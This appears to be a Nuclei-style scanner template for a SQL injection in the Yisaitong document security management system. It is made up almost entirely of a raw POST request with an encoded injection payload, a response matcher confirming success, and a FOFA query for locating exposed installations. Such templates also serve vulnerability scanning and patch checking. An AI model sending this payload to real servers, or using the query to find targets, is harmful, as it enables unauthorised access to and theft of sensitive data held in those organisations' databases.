id: yisaitong-CDGAuthoriseTempletService1-sqli

info:
  name: Yisaitong Document Security Management System SQL Injection
  author: Co5mos
  severity: critical
  description: |
    亿赛通电子文档安全管理系统存在 SQL 注入漏洞，攻击者可以利用此漏洞获取数据库中敏感信息。
  metadata:
    verified: true
    fofa-query: app="亿赛通-电子文档安全管理系统"
  tags: sqli, yisaitong

http:
  - raw:
      - |
        POST /CDGServer3/CDGAuthoriseTempletService1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        CGKFAICMPFGICCPHKFGGGBOMICMOKOBGPCBLKPCAHAGPFJHFABCPPKIOHIAIBJLLHJCODJMAGKBGIKDAFJHJMMKBDHABAJPBFNLBOIDFBHMMFKFHLPIAOPHEOAICJEMBIGKENNJMKPCPIPIEDENMAJCNPPCEAGHMLBPJAAMFICEAHJLDPCKPNPOMEEHBNFEHMDPPCMPIEOMFBEFECIALFMDIMAFOLIHNGIPLFLJGDDNOCFENDMAJDECKHGILHEKFEJOKOLAOGCJKAHGBIFANEGJLDALFMICGHBAIFJAIPKJBPAJOBGDCOCNKBCGNNFEAONMPIAFBMPFIAPDLBAKGDLFBABPKMFBKIPBFAPFBLHKFIIPGCNADADMOHHOIGDJKMGIFGMBHACNIOLHGGOALNEKFBKMLPKPNIOHKMCCDMEJOHMKOALIIGEGBGELCLMPPBNGGMJKGIOLOCPMBPMBEMAOFLJMPEJOLHDOIJDIEAJJMFNGCOPMLKIIMBMMIAMHFFLFDGFCMPN

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, 'ODACHHNJBEELEHOGGNBIHOJAKKBLPAJJCJMGOJMMKLABKADEOPLJDBBKGEDAMOPJPJ')
        condition: and
